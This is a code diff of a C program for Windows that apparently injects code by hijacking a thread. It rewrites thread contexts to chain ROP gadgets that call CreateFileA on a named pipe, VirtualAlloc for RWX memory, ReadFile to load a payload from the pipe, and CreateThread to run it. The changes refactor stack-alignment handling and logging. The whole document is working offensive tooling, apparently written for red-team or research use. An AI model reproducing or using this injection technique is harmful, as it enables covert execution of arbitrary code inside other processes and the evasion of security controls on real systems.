@@ -91,11 +91,8 @@ void slay(HANDLE hThread, Gadgets gadgets, DWORD64 a, DWORD64 b, DWORD64 c, DWOR
 
     ctx.Rsp += 8;
 
-    //ctx.Rsp -= 32;
-
     if (ctx.Rsp != (ctx.Rsp & ~0x0F)) {
-       //ctx.Rsp = (ctx.Rsp & ~0x0F);
-        printf("weird stack");
+        printf("[!] WARNING! About to execute with an unaligned stack.\n[!] This shouldn't happen and may crash the process\n");
     }
 
     ctx.Rip = gadgets.ret;
@@ -144,8 +141,6 @@ void push_junk(HANDLE hThread, Gadgets gadgets) {
     SuspendThread(hThread);
 }
 
-
-//push val to stack, but returns return val of previous fn called (in eax)
 DWORD64 get_ret_val(HANDLE hThread, Gadgets gadgets) {
 
     CONTEXT ctx = { .ContextFlags = CONTEXT_FULL };
@@ -164,10 +159,21 @@ DWORD WINAPI ThreadFunc(LPVOID lpParam) {
     return 0;
 }
 
-DWORD64 CallFuncRemote(HANDLE hThread, Gadgets gadgets, DWORD64 funcAddr, BOOL alignStack, BOOL returnVal, const uint64_t count, const DWORD64 parameters[]) {
 
-    // 1. Check/Fix Stack
-    if (alignStack) {
+DWORD64 CallFuncRemote(HANDLE hThread, Gadgets gadgets, DWORD64 funcAddr, BOOL returnVal, const uint64_t count, const DWORD64 parameters[]) {
+
+    // 1. Check/Fix Stack alignment
+    CONTEXT ctx = { .ContextFlags = CONTEXT_FULL };
+
+    SuspendThread(hThread);
+    GetThreadContext(hThread, &ctx);
+
+    int isStackAlignmentGood = ((ctx.Rsp + 0x08) == ((ctx.Rsp + 0x08) & ~0x0F));
+    int isEvenPUSHParameters = ((count <= 4) || (count % 2 == 0));
+
+    ResumeThread(hThread);
+
+    if (isStackAlignmentGood ^ isEvenPUSHParameters) {
         pushm(hThread, gadgets, 0x00);
     }
 
@@ -238,6 +244,7 @@ int main(void) {
     const UINT32 HeapAllocSize = 0x2000;
 
     // Set RIP to a `jmp $`, blocks when kernel exit
+    // SuspendThread(hThread);
     CONTEXT ctx = { .ContextFlags = CONTEXT_FULL };
     GetThreadContext(hThread, &ctx);
 
@@ -275,14 +282,14 @@ int main(void) {
     printf("[*] Pipe name injected to stack\n");
 
     // CreateFileA
-    DWORD64 phand = CallFuncRemote(hThread, gadgets, fnCreateFileA, TRUE, TRUE, 7, (DWORD64[]) { namptr, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0});
+    DWORD64 phand = CallFuncRemote(hThread, gadgets, fnCreateFileA, TRUE, 7, (DWORD64[]) { namptr, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0});
     if ((HANDLE)phand == INVALID_HANDLE_VALUE) {
         printf("[!] CreateFileA returned a bad HANDLE\n");
         return 1;
     }
 
     // VirtualAlloc
-    DWORD64 addr = CallFuncRemote(hThread, gadgets, fnVirtualAlloc, TRUE, TRUE, 4, (DWORD64[]) { 0, 0x10000, MEM_COMMIT, PAGE_EXECUTE_READWRITE });
+    DWORD64 addr = CallFuncRemote(hThread, gadgets, fnVirtualAlloc, TRUE, 4, (DWORD64[]) { 0, 0x10000, MEM_COMMIT, PAGE_EXECUTE_READWRITE });
     if (!addr) {
         printf("[*] VirtualAlloc Failed\n");
         return 1;
@@ -294,17 +301,15 @@ int main(void) {
     WriteFile(pipe, buf, sizeof(buf), &bw, NULL);
 
     // ReadFile
-    CallFuncRemote(hThread, gadgets, fnReadFile, FALSE, FALSE, 5, (DWORD64[]) { phand, addr, HeapAllocSize, namptr, 0 });
+    CallFuncRemote(hThread, gadgets, fnReadFile, FALSE, 5, (DWORD64[]) { phand, addr, HeapAllocSize, namptr, 0 });
     printf("[*] ReadFile called\n");
 
-
     // CloseHandle
-    CallFuncRemote(hThread, gadgets, fnCloseHandle, TRUE, FALSE, 1, (DWORD64[]) { phand });
+    CallFuncRemote(hThread, gadgets, fnCloseHandle, FALSE, 1, (DWORD64[]) { phand });
     printf("[*] CloseHandle called\n");
 
-
     // CreateThread
-    CallFuncRemote(hThread, gadgets, fnCreateThread, TRUE, FALSE, 6, (DWORD64[]) { 0, 0, addr, 0, 0, 0 });
+    CallFuncRemote(hThread, gadgets, fnCreateThread, FALSE, 6, (DWORD64[]) { 0, 0, addr, 0, 0, 0 });
     printf("[*] CreateThread called\n");
 
     WaitForSingleObject(hThread, INFINITE);
